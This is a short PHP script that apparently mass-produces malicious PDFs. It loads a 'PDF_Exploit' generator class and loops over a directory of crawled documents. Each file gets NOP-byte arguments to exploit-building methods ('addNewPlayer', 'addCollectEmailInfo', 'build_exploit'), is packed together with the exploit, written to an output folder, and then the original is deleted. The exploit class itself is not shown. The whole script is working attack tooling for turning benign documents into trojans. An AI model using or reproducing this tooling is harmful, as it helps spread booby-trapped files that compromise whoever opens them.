<?php 
require('pdf_exploit_generator.class.php');

//FPDF hits fatal errors resulting in the automated process failing so handleShutdown performs actions when fatal error kicks in
function handleShutdown() {
        global $file; //grab the file handle
        $error = error_get_last(); //snatch the error
        if($error !== NULL){ //delete the file no matter what so processing can continue
                unlink($file);
        }
        else{
                unlink($file);
        }
    }

register_shutdown_function('handleShutdown'); //register the fatal error trigger

$dir = "baby_crawler"; //pull from our dir
$dh  = opendir($dir);
while (false !== ($filename = readdir($dh))) {
        if($filename != "." &&  $filename != "..") {
        $file = $dir . "/" . $filename;
                echo "FILE: " . $file . "\n";

$pdf = new PDF_Exploit( 'P', 'mm', 'A4' );
$pdf->SetProtection(array('print'),'');
$pdf->addNewPlayer("\x90");
$pdf->addCollectEmailInfo("\x90");
$pdf->build_exploit();
//$pdf->setFiles(array('sample_docs/cats.pdf')); //set file manually
$pdf->setFiles(array($file)); //set the file automatically
$pdf->concat(); //pack them
$pdf->Output("packed_docs/".$filename,"F");
unlink($file);
}
}
?>
